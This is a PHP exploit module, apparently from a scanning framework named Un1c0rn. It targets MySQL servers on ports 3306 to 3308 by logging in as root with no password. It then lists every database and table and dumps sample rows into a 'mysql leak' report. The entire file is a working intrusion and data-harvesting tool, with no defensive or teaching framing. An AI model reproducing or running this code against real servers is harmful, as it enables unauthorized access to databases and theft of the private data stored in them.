<?php
namespace Un1c0rn\Workers\Exploits;
use mysqli;
class OpenMysql extends \Un1c0rn\BaseExploit implements \Un1c0rn\ExploitInterface {
	function getExploitData() {
		$m =  mysqli_connect($this->ip,'root',null,null,$this->port);
		if($m->connect_errno) return false;
		$resDB = mysqli_query($m,'SHOW DATABASES');
		if($resDB->num_rows < 1) return false;
		$data = 'BEGIN mysql leak :'.PHP_EOL;
		while($row = $resDB->fetch_row()) {
			list($database) = $row;
			$m->select_db($database);
			$data .= $database.' DB selected'.PHP_EOL;
			$resTABLE = mysqli_query($m,'SHOW TABLES');
			if(!$resTABLE) continue;
			while($row = $resTABLE->fetch_row()) {
				list($table) = $row;
				$data .= 'Found table '.$table.' dumping 3 rows :'.PHP_EOL;
				$resPAYLOAD = mysqli_query($m,'SELECT * FROM '.mysqli_real_escape_string($table).' LIMIT 3');
				if(!$resPAYLOAD) continue;
				while($payload = $resPAYLOAD->fetch_assoc()) {
					$data .= json_encode($payload).PHP_EOL;
				}
				$data .= str_repeat('-',20).PHP_EOL;
			} 
		}
		$data .= 'END Mysql leak'.PHP_EOL;
		return $data;
	}
	function getAffectedPorts() {
		return array(3306,3307,3308);
	}
	function getTag() {
		return 'weak-mysql';
	}
}
